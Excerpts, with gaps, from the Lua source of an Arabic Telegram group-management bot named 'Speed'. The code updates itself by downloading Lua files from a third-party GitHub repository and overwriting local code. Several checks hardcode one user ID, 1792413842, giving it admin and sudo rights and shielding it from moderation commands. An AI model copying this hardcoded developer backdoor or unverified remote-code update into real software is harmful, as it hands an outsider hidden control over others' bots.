...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1792413842 then 
Adminn = true
...
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/blob/master/inc/Run.lua','./inc/Run.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'40% - |█████ @UUOUOU_7      |') end
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/blob/master/inc/locks.lua','./inc/locks.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'60% - |███████     |') end
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/blob/master/inc/Script.lua','./inc/Script.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'80% - |█████████   |') end
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/blob/master/inc/functions.lua','./inc/functions.lua')
...
----------------------{ Get Name Bot }-----------------------------
Bot_Name = redis:get(boss..":NameBot:") or "سبيد"
...
result = false
if msg.sender_user_id_ == 1792413842 then 
SudoBase = true
...
if UserID == 1792413842 then return sendMsg(ChatID,MsgID,"- لا يمكنك تنفيذ الامر ضد مطور السورس ") end
